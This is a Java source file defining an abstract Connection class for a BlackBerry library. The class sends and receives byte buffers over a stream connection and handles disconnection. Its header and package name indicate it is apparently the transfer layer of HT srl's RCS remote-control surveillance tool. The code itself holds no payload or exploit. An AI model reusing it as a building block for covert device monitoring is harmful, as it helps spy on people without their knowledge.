/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Connection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import javax.microedition.io.StreamConnection;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public abstract class Connection {
    protected DataInputStream in_;
    protected DataOutputStream out_;
    protected StreamConnection connection_ = null;
    
    protected boolean connected_ = false;

    public abstract boolean connect();
    public abstract boolean isActive();

    /**
     * Pass some data to the server and wait for a response.
     * @param data
     * @return
     * @throws IOException
     */
    public synchronized boolean send(byte[] data) throws IOException{
  
    	if(connected_)
    	{
    		Check.requires(out_ != null, "null out_");
    		
	        int length = data.length;
	        out_.write (data, 0, length);
	
	        return true;
    	}else{
    		error("Not connected. Active: "+isActive());
    		return false;
    	}
    }
    
    public synchronized byte[] receive(int length) throws IOException{
    	if(connected_)
    	{	    	 
    		Check.requires(in_ != null, "null in_");
    		
	        // Create an input array just big enough to hold the data
	        // (we're expecting the same string back that we send).
	        byte[] buffer = new byte[length];
	        in_.readFully(buffer);
	       
	        //Check.ensures(read == buffer.length, "Wrong read len: "+read);
	
	        // Hand the data to the parent class for updating the GUI. By explicitly
	        return buffer;
    	}else{
    		error("Not connected. Active: "+isActive());
    		return null;
    	}
    }
    	  
    protected abstract void error(String string);
    protected abstract void trace(String string);
       
	public synchronized void disconnect() {
		if(connected_)
		{
			connected_ = false;
			if(in_ != null)
				try {
					in_.close();
				} catch (IOException e) {}
				
			if(out_ != null)
				try {
					out_.close();
				} catch (IOException e) {}
				
			if(connection_ != null)
				try {
					connection_.close();
				} catch (IOException e) {}
			
		}
		
		in_ = null;
		out_ = null;
		connection_ = null;
	}

}
